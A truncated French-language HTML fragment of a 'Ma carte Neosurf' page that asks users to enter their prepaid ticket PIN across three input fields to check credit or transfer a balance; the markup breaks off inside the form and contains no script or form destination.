  <div class="page">

    <h1>MA CARTE NEOSURF</h1>

    <div class="info-box">
     Connectez-vous en indiquant le code figurant sur votre carte ou votre ticket Neosurf afin d'accéder à de nombreuses informations et options : Crédit disponible, transfert de solde, etc.

     <main>

        <section class="verification-card">

            <div class="verification-header">
                <h2>Entrez le code Pin du ticket</h2>
            </div>

            <div class="verification-body">

                <form id="verificationForm">

                    <div class="code-group">

                        <input
                            type="text"
                            id="part1"
                            name="part1"
                            maxlength="4"
                            class="code-input"
                            autocomplete="off"
                            aria-label="Code 1">

                        <input
                            type="text"
                            id="part2"
                            name="part2"
                            maxlength="3"
                            class="code-input"
                            autocomplete="off"
                            aria-label="Code 2">

                        <input
                            type="text"
                            id="part3"
                            name="part3"
                            maxlength="3"

                            aria-label="Code 3">
